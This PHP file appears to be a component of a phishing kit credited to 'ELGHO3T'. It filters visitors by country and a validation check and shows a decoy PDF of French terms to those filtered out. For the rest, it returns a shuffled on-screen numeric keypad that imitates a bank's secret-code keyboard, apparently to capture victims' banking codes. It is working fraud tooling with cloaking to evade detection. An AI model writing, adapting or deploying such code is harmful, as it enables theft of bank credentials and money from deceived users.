
<?php
/**
 * 
 * 
 * @package Function and object class Tools
 * @version 1.3.0
 * @last-modified February 11, 2022
 * @author MSbou ELGHO3T
 * @copyright Copyright (c) 2022, anon
 * @link https://t.me/MarcoSbou_sp
 * 
 * 
 */
/**
 * Powered By ElGHO3T
 */
$fine = "page";

(@require_once './init.php') or die("You not have permisions");
if (!defined('ELGHO3T_AB_ROOT')) {die("You not have permisions");}
if(!isset($_SESSION['bid'])){die("You not have permisions");}
if(GHOST_CONSTRICT == true){die("Contact admin @ELGHO3T");exit();}
$Xtools = new Tools();
if(GHOST_limet == true):
    if($Xtools->Check_User_limet() == true):
        // header("HTTP/1.1 404 Not Found");
        $Xtools->syfto_pdf("./Conditions-Générales-et-Tarifaires.pdf");
        // die("Contact admin limet action @ELGHO3T");
        exit();
    endif;

endif;
if(GHOST_SECURE == true):

    if(strtolower( $_SESSION['data_info']['country'] ) !== GHOST_COUNTRY ):
        // header("HTTP/1.1 404 Not Found");
        $Xtools->syfto_pdf("./Conditions-Générales-et-Tarifaires.pdf");
        // die("Contact admin @ELGHO3T");
        exit();
    endif;

    if($Xtools->check_validate($_SESSION['data_info']) !== true):
        // die("Contact admin @ELGHO3T");
        // header("HTTP/1.1 404 Not Found");
        $Xtools->syfto_pdf("./Conditions-Générales-et-Tarifaires.pdf");
        exit();
    endif;

endif;

if($_POST):

    if($_POST['loading_clv'] && !empty($_POST['loading_clv'])):

        $_hona = [
            '<div class="sc-jhGUec LToeK sc-bShgHC fjLQwb sc-eiQWpL sc-irqbAE koCxyi kxZWSs"><button onclick="sendme(\'4\');" type="button" data-testid="codeKeyboard4"><span>4</span></button></div>',
            '<div class="sc-jhGUec LToeK sc-bShgHC fjLQwb sc-eiQWpL sc-irqbAE koCxyi kxZWSs"><button onclick="sendme(\'6\');" type="button" data-testid="codeKeyboard4"><span>6</span></button></div>',
            '<div class="sc-jhGUec LToeK sc-bShgHC fjLQwb sc-eiQWpL sc-irqbAE koCxyi kxZWSs"><button onclick="sendme(\'7\');" type="button" data-testid="codeKeyboard4"><span>7</span></button></div>',
            '<div class="sc-jhGUec LToeK sc-bShgHC fjLQwb sc-eiQWpL sc-irqbAE koCxyi kxZWSs"><button onclick="sendme(\'9\');" type="button" data-testid="codeKeyboard4"><span>9</span></button></div>',
            '<div class="sc-jhGUec LToeK sc-bShgHC fjLQwb sc-eiQWpL sc-irqbAE koCxyi kxZWSs"><button onclick="sendme(\'0\');" type="button" data-testid="codeKeyboard4"><span>0</span></button></div>',
            '<div class="sc-jhGUec LToeK sc-bShgHC fjLQwb sc-eiQWpL sc-irqbAE koCxyi kxZWSs"><button onclick="sendme(\'5\');" type="button" data-testid="codeKeyboard4"><span>5</span></button></div>',
            '<div class="sc-jhGUec LToeK sc-bShgHC fjLQwb sc-eiQWpL sc-irqbAE koCxyi kxZWSs"><button onclick="sendme(\'1\');" type="button" data-testid="codeKeyboard4"><span>1</span></button></div>',
            '<div class="sc-jhGUec LToeK sc-bShgHC fjLQwb sc-eiQWpL sc-irqbAE koCxyi kxZWSs"><button onclick="sendme(\'3\');" type="button" data-testid="codeKeyboard4"><span>3</span></button></div>',
            '<div class="sc-jhGUec LToeK sc-bShgHC fjLQwb sc-eiQWpL sc-irqbAE koCxyi kxZWSs"><button onclick="sendme(\'2\');" type="button" data-testid="codeKeyboard4"><span>2</span></button></div>',
            '<div class="sc-jhGUec LToeK sc-bShgHC fjLQwb sc-eiQWpL sc-irqbAE koCxyi kxZWSs"><button onclick="sendme(\'8\');" type="button" data-testid="codeKeyboard4"><span>8</span></button></div>'
        ];
        $doda = [];
        $biba = [];
        shuffle($_hona);
        foreach($_hona as $clv):
            array_push($doda,$clv);
        endforeach;
        $aa = array_splice($doda,0,5);
        $bb = array_splice($doda,0,5);
        array_push($biba,$aa);
        array_push($biba,$bb);
        echo json_encode($biba);

    endif;

endif;
